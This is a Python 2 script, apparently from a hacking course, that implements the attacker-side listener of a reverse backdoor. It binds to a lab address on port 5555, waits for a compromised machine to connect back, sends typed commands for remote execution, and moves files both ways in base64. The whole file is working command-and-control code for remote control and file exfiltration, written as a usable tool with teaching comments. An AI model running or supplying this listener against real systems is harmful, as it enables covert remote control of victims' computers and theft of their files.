#!/usr/bin/env python

import socket
import json
import base64

class Listener:
    
    def __init__(self, ip, port):
        # Listener socket
        # SOCK_STREAM is a TCP connection
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Changing the options to REUSE the above socket 
        # arg1 = level (SOL_SOCKET is the socket layer itself, which is application independent)
        # arg2 = option
        # arg3 = value of option
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Binding socket to own computer
        listener.bind((ip, port))

        # A backlog is the number of connections that can be queued before the system starts refusing connections.
        listener.listen(0)

        print("[+] Waiting for incoming connections...")

        # Accepting the connections on current port
        # connection = socket object that represents the connection
        # address = Address that is bound to the connection
        self.connection, address = listener.accept()

        print("[+] Got a connection from " + str(address))
  
    def reliable_send(self, data):

        # Serialization for sending data reliably over TCP

        # Converts data into json object
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                # Unwrapping the json object to original data
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
            
        return self.reliable_receive()

    def read_file(self, file_path):
        # rb = read files as binary
        with open(file_path, "rb") as file:
            # Returning with base64 encoding, 
            # which converts unknown characters to known characters
            #  that json and python can parse
            return base64.b64encode(file.read())

    def write_file(self, file_path, content):
        with open(file_path, "wb") as file:
            # Unwrapping base64 encoding and writting to file
            file.write(base64.b64decode(content))
            return ("[+] Download successful!")

    def run(self):
        while True:
            command = raw_input(">> ")
            # For python3:
            # command = input(">> ")
            command = command.split(" ")
        
            try:    
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    # To send command, file name and file content
                    command.append(file_content)
                
                result = self.execute_remotely(command)
                
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            
            except Exception:
                result = "[-] Error during command execution!"
                   
            print(result)
                
my_listener = Listener("192.168.56.101", 5555)
my_listener.run()
